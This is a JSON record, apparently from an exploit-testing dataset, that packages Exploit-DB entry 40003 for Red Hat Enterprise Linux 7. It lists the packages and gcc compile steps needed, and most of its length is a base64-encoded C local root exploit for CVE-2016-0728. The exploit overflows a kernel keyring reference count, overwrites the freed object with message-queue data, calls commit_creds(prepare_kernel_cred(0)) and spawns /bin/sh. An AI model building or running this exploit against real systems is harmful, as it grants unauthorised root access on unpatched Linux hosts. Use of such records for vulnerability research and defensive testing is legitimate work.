{
    "cpes": {
        "cpe:/o:redhat:enterprise_linux:7.0:ga:server": {
            "packages": [
                "dos2unix", 
                "gcc", 
                "keyutils-libs-devel"
            ], 
            "staging": [
                "dos2unix", 
                "40003.c;", 
                "gcc", 
                "-lkeyutils", 
                "40003.c", 
                "-lkeyutils", 
                "-Wall", 
                "-o", 
                "exploit"
            ], 
            "scores": {
                "stride": "000000"
            }
        }
    }, 
    "source": "exploit-database", 
    "exploit": "LyoNCiMgRXhwbG9pdCBUaXRsZTogTGludXgga2VybmVsIFJFRkNPVU5UIG92ZXJmbG93L1VzZS1BZnRlci1GcmVlIGluIGtleXJpbmdzDQojIERhdGU6IDE5LzEvMjAxNg0KIyBFeHBsb2l0IEF1dGhvcjogUGVyY2VwdGlvbiBQb2ludCBUZWFtDQojIENWRSA6IENWRS0yMDE2LTA3MjgNCiovDQoNCi8qIENWRS0yMDE2LTA3MjggbG9jYWwgcm9vdCBleHBsb2l0DQogICBtb2RpZmllZCBieSBGZWRlcmljbyBCZW50byB0byByZWFkIGtlcm5lbCBzeW1ib2xzIGZyb20gL3Byb2Mva2FsbHN5bXMNCiAgIHByb3BzIHRvIGdyc2VjdXJpdHkvUGFYIGZvciBwcmV2ZW50aW5nIHRoaXMgaW4gc28gbWFueSB3YXlzDQoNCiAgICQgZ2NjIGN2ZV8yMDE2XzA3MjguYyAtbyBjdmVfMjAxNl8wNzI4IC1sa2V5dXRpbHMgLVdhbGwNCiAgICQgLi9jdmVfMjAxNl8wNzIgUFBfS0VZICovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPGtleXV0aWxzLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8dGltZS5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQojaW5jbHVkZSA8c3lzL2lwYy5oPg0KI2luY2x1ZGUgPHN5cy9tc2cuaD4NCg0KdHlwZWRlZiBpbnQgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9jb21taXRfY3JlZHMpKHVuc2lnbmVkIGxvbmcgY3JlZCk7DQp0eXBlZGVmIHVuc2lnbmVkIGxvbmcgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9wcmVwYXJlX2tlcm5lbF9jcmVkKSh1bnNpZ25lZCBsb25nIGNyZWQpOw0KX2NvbW1pdF9jcmVkcyBjb21taXRfY3JlZHM7DQpfcHJlcGFyZV9rZXJuZWxfY3JlZCBwcmVwYXJlX2tlcm5lbF9jcmVkOw0KDQojZGVmaW5lIFNUUlVDVF9MRU4gKDB4YjggLSAweDMwKQ0KI2RlZmluZSBDT01NSVRfQ1JFRFNfQUREUiAoMHhmZmZmZmZmZjgxMGJiMDUwKQ0KI2RlZmluZSBQUkVQQVJFX0tFUk5FTF9DUkVEU19BRERSICgweGZmZmZmZmZmODEwYmIzNzApDQoNCg0KDQpzdHJ1Y3Qga2V5X3R5cGUgew0KICAgIGNoYXIgKiBuYW1lOw0KICAgICAgICBzaXplX3QgZGF0YWxlbjsNCiAgICAgICAgdm9pZCAqIHZldF9kZXNjcmlwdGlvbjsNCiAgICAgICAgdm9pZCAqIHByZXBhcnNlOw0KICAgICAgICB2b2lkICogZnJlZV9wcmVwYXJzZTsNCiAgICAgICAgdm9pZCAqIGluc3RhbnRpYXRlOw0KICAgICAgICB2b2lkICogdXBkYXRlOw0KICAgICAgICB2b2lkICogbWF0Y2hfcHJlcGFyc2U7DQogICAgICAgIHZvaWQgKiBtYXRjaF9mcmVlOw0KICAgICAgICB2b2lkICogcmV2b2tlOw0KICAgICAgICB2b2lkICogZGVzdHJveTsNCn07DQoNCi8qIHRoYW5rcyBzcGVuZGVyIC0gRmVkZXJpY28gQmVudG8gKi8NCnN0YXRpYyB1bnNpZ25lZCBsb25nIGdldF9rZXJuZWxfc3ltKGNoYXIgKm5hbWUpDQp7DQogICAgRklMRSAqZjsNCiAgICB1bnNpZ25lZCBsb25nIGFkZHI7DQogICAgY2hhciBkdW1teTsNCiAgICBjaGFyIHNuYW1lWzI1Nl07DQogICAgaW50IHJldDsNCg0KICAgIGYgPSBmb3BlbigiL3Byb2Mva2FsbHN5bXMiLCAiciIpOw0KICAgIGlmIChmID09IE5VTEwpIHsNCiAgICAgICAgZnByaW50ZihzdGRvdXQsICJVbmFibGUgdG8gb2J0YWluIHN5bWJvbCBsaXN0aW5nIVxuIik7DQogICAgICAgIGV4aXQoMCk7DQogICAgfQ0KDQogICAgcmV0ID0gMDsNCiAgICB3aGlsZShyZXQgIT0gRU9GKSB7DQogICAgICAgIHJldCA9IGZzY2FuZihmLCAiJXAgJWMgJXNcbiIsICh2b2lkICoqKSZhZGRyLCAmZHVtbXksIHNuYW1lKTsNCiAgICAgICAgaWYgKHJldCA9PSAwKSB7DQogICAgICAgICAgICBmc2NhbmYoZiwgIiVzXG4iLCBzbmFtZSk7DQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIXN0cmNtcChuYW1lLCBzbmFtZSkpIHsNCiAgICAgICAgICAgIGZwcmludGYoc3Rkb3V0LCAiWytdIFJlc29sdmVkICVzIHRvICVwXG4iLCBuYW1lLCAodm9pZCAqKWFkZHIpOw0KICAgICAgICAgICAgZmNsb3NlKGYpOw0KICAgICAgICAgICAgcmV0dXJuIGFkZHI7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBmY2xvc2UoZik7DQogICAgcmV0dXJuIDA7DQp9DQoNCnZvaWQgdXNlcnNwYWNlX3Jldm9rZSh2b2lkICoga2V5KSB7DQogICAgICAgIGNvbW1pdF9jcmVkcyhwcmVwYXJlX2tlcm5lbF9jcmVkKDApKTsNCn0NCg0KaW50IG1haW4oaW50IGFyZ2MsIGNvbnN0IGNoYXIgKmFyZ3ZbXSkgew0KICAgIGNvbnN0IGNoYXIgKmtleXJpbmdfbmFtZTsNCiAgICBzaXplX3QgaSA9IDA7DQogICAgICAgIHVuc2lnbmVkIGxvbmcgaW50IGwgPSAweDEwMDAwMDAwMC8yOw0KICAgIGtleV9zZXJpYWxfdCBzZXJpYWwgPSAtMTsNCiAgICBwaWRfdCBwaWQgPSAtMTsNCiAgICAgICAgc3RydWN0IGtleV90eXBlICogbXlfa2V5X3R5cGUgPSBOVUxMOw0KDQogICAgICAgIHN0cnVjdCB7DQogICAgICAgIGxvbmcgbXR5cGU7DQogICAgICAgIGNoYXIgbXRleHRbU1RSVUNUX0xFTl07DQogICAgfSBtc2cgPSB7MHg0MTQxNDE0MTQxNDE0MTQxLCB7MH19Ow0KICAgIGludCBtc3FpZDsNCg0KICAgIGlmIChhcmdjICE9IDIpIHsNCiAgICAgICAgcHV0cygidXNhZ2U6IC4va2V5cyA8a2V5X25hbWU+Iik7DQogICAgICAgIHJldHVybiAxOw0KICAgIH0NCg0KICAgICAgICBwcmludGYoIlsrXSB1aWQ9JWQsIGV1aWQ9JWRcbiIsIGdldHVpZCgpLCBnZXRldWlkKCkpOw0KICAgIGNvbW1pdF9jcmVkcyA9IChfY29tbWl0X2NyZWRzKWdldF9rZXJuZWxfc3ltKCJjb21taXRfY3JlZHMiKTsNCiAgICAgICAgcHJlcGFyZV9rZXJuZWxfY3JlZCA9IChfcHJlcGFyZV9rZXJuZWxfY3JlZClnZXRfa2VybmVsX3N5bSgicHJlcGFyZV9rZXJuZWxfY3JlZCIpOw0KICAgIGlmKGNvbW1pdF9jcmVkcyA9PSBOVUxMIHx8IHByZXBhcmVfa2VybmVsX2NyZWQgPT0gTlVMTCkgew0KICAgICAgICBjb21taXRfY3JlZHMgPSAoX2NvbW1pdF9jcmVkcylDT01NSVRfQ1JFRFNfQUREUjsNCiAgICAgICAgICAgICAgICBwcmVwYXJlX2tlcm5lbF9jcmVkID0gKF9wcmVwYXJlX2tlcm5lbF9jcmVkKVBSRVBBUkVfS0VSTkVMX0NSRURTX0FERFI7DQogICAgICAgICAgICAgICAgaWYoY29tbWl0X2NyZWRzID09IChfY29tbWl0X2NyZWRzKTB4ZmZmZmZmZmY4MTBiYjA1MCB8fCBwcmVwYXJlX2tlcm5lbF9jcmVkID09IChfcHJlcGFyZV9rZXJuZWxfY3JlZCkweGZmZmZmZmZmODEwYmIzNzApDQogICAgICAgICAgICAgICAgICAgIHB1dHMoIlstXSBZb3UgcHJvYmFibHkgbmVlZCB0byBjaGFuZ2UgdGhlIGFkZHJlc3Mgb2YgY29tbWl0X2NyZWRzIGFuZCBwcmVwYXJlX2tlcm5lbF9jcmVkIGluIHNvdXJjZSIpOw0KICAgIH0NCg0KICAgICAgICBteV9rZXlfdHlwZSA9IG1hbGxvYyhzaXplb2YoKm15X2tleV90eXBlKSk7DQoNCiAgICAgICAgbXlfa2V5X3R5cGUtPnJldm9rZSA9ICh2b2lkKil1c2Vyc3BhY2VfcmV2b2tlOw0KICAgICAgICBtZW1zZXQobXNnLm10ZXh0LCAnQScsIHNpemVvZihtc2cubXRleHQpKTsNCg0KICAgICAgICAvLyBrZXktPnVpZA0KICAgICAgICAqKGludCopKCZtc2cubXRleHRbNTZdKSA9IDB4M2U4OyAvKiBnZXRldWlkKCkgKi8NCiAgICAgICAgLy9rZXktPnBlcm0NCiAgICAgICAgKihpbnQqKSgmbXNnLm10ZXh0WzY0XSkgPSAweDNmM2YzZjNmOw0KDQogICAgICAgIC8va2V5LT50eXBlDQogICAgICAgICoodW5zaWduZWQgbG9uZyAqKSgmbXNnLm10ZXh0WzgwXSkgPSAodW5zaWduZWQgbG9uZylteV9rZXlfdHlwZTsNCg0KICAgICAgICBpZiAoKG1zcWlkID0gbXNnZ2V0KElQQ19QUklWQVRFLCAwNjQ0IHwgSVBDX0NSRUFUKSkgPT0gLTEpIHsNCiAgICAgICAgICAgICAgIHBlcnJvcigibXNnZ2V0Iik7DQogICAgICAgICAgICBleGl0KDEpOw0KICAgICAgICB9DQoNCiAgICAgICAga2V5cmluZ19uYW1lID0gYXJndlsxXTsNCg0KICAgIC8qIFNldCB0aGUgbmV3IHNlc3Npb24ga2V5cmluZyBiZWZvcmUgd2Ugc3RhcnQgKi8NCg0KICAgIHNlcmlhbCA9IGtleWN0bChLRVlDVExfSk9JTl9TRVNTSU9OX0tFWVJJTkcsIGtleXJpbmdfbmFtZSk7DQogICAgaWYgKHNlcmlhbCA8IDApIHsNCiAgICAgICAgcGVycm9yKCJrZXljdGwiKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICB9DQoNCiAgICBpZiAoa2V5Y3RsKEtFWUNUTF9TRVRQRVJNLCBzZXJpYWwsIEtFWV9QT1NfQUxMIHwgS0VZX1VTUl9BTEwgfCBLRVlfR1JQX0FMTCB8IEtFWV9PVEhfQUxMKSA8IDApIHsNCiAgICAgICAgcGVycm9yKCJrZXljdGwiKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KDQogICAgcHV0cygiWytdIEluY3JlZmluZy4uLiIpOw0KICAgICAgICBmb3IgKGkgPSAxOyBpIDwgMHhmZmZmZmZmZDsgaSsrKSB7DQogICAgICAgICAgICBpZiAoaSA9PSAoMHhmZmZmZmZmZiAtIGwpKSB7DQogICAgICAgICAgICAgICAgICAgbCA9IGwvMjsNCiAgICAgICAgICAgICAgICAgICAgc2xlZXAoNSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoa2V5Y3RsKEtFWUNUTF9KT0lOX1NFU1NJT05fS0VZUklORywga2V5cmluZ19uYW1lKSA8IDApIHsNCiAgICAgICAgICAgICAgICAgICAgcGVycm9yKCJbLV0ga2V5Y3RsIik7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBzbGVlcCg1KTsNCiAgICAgICAgLyogaGVyZSB3ZSBhcmUgZ29pbmcgdG8gbGVhayB0aGUgbGFzdCByZWZlcmVuY2VzIHRvIG92ZXJmbG93ICovDQogICAgICAgIGZvciAoaT0wOyBpPDU7ICsraSkgew0KICAgICAgICAgICAgaWYgKGtleWN0bChLRVlDVExfSk9JTl9TRVNTSU9OX0tFWVJJTkcsIGtleXJpbmdfbmFtZSkgPCAwKSB7DQogICAgICAgICAgICAgICAgICAgIHBlcnJvcigiWy1dIGtleWN0bCIpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdXRzKCJbK10gRmluaXNoZWQgaW5jcmVmaW5nIik7DQogICAgICAgIHB1dHMoIlsrXSBGb3JraW5nLi4uIik7DQogICAgICAgIC8qIGFsbG9jYXRlIG1zZyBzdHJ1Y3QgaW4gdGhlIGtlcm5lbCByZXdyaXRpbmcgdGhlIGZyZWVkIGtleXJpbmcgb2JqZWN0ICovDQogICAgICAgIGZvciAoaT0wOyBpPDY0OyBpKyspIHsNCiAgICAgICAgICAgIHBpZCA9IGZvcmsoKTsNCiAgICAgICAgICAgIGlmIChwaWQgPT0gLTEpIHsNCiAgICAgICAgICAgICAgICAgICAgcGVycm9yKCJbLV0gZm9yayIpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmIChwaWQgPT0gMCkgew0KICAgICAgICAgICAgICAgICAgICBzbGVlcCgyKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKChtc3FpZCA9IG1zZ2dldChJUENfUFJJVkFURSwgMDY0NCB8IElQQ19DUkVBVCkpID09IC0xKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBwZXJyb3IoIlstXSBtc2dnZXQiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoMSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZm9yIChpID0gMDsgaSA8IDY0OyBpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtc2dzbmQobXNxaWQsICZtc2csIHNpemVvZihtc2cubXRleHQpLCAwKSA9PSAtMSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwZXJyb3IoIlstXSBtc2dzbmQiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgxKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBzbGVlcCgtMSk7DQogICAgICAgICAgICAgICAgICAgIGV4aXQoMSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdXRzKCJbK10gRmluaXNoZWQgZm9ya2luZyIpOw0KICAgICAgICBzbGVlcCg1KTsNCg0KICAgICAgICAvKiBjYWxsIHVzZXJzcGFjZV9yZXZva2UgZnJvbSBrZXJuZWwgKi8NCiAgICAgICAgcHV0cygiWytdIENhbGluZyByZXZva2UuLi4iKTsNCiAgICAgICAgaWYgKGtleWN0bChLRVlDVExfUkVWT0tFLCBLRVlfU1BFQ19TRVNTSU9OX0tFWVJJTkcpID09IC0xKSB7DQogICAgICAgICAgICBwZXJyb3IoIlsrXSBrZXljdGxfcmV2b2tlIik7DQogICAgICAgIH0NCg0KICAgICAgICBwcmludGYoInVpZD0lZCwgZXVpZD0lZFxuIiwgZ2V0dWlkKCksIGdldGV1aWQoKSk7DQogICAgICAgIGV4ZWNsKCIvYmluL3NoIiwgIi9iaW4vc2giLCBOVUxMKTsNCg0KICAgICAgICByZXR1cm4gMDsNCn0=", 
    "filename": "platforms/linux/local/40003.c", 
    "id": "40003", 
    "cves": [
        "CVE-2016-0728"
    ]
}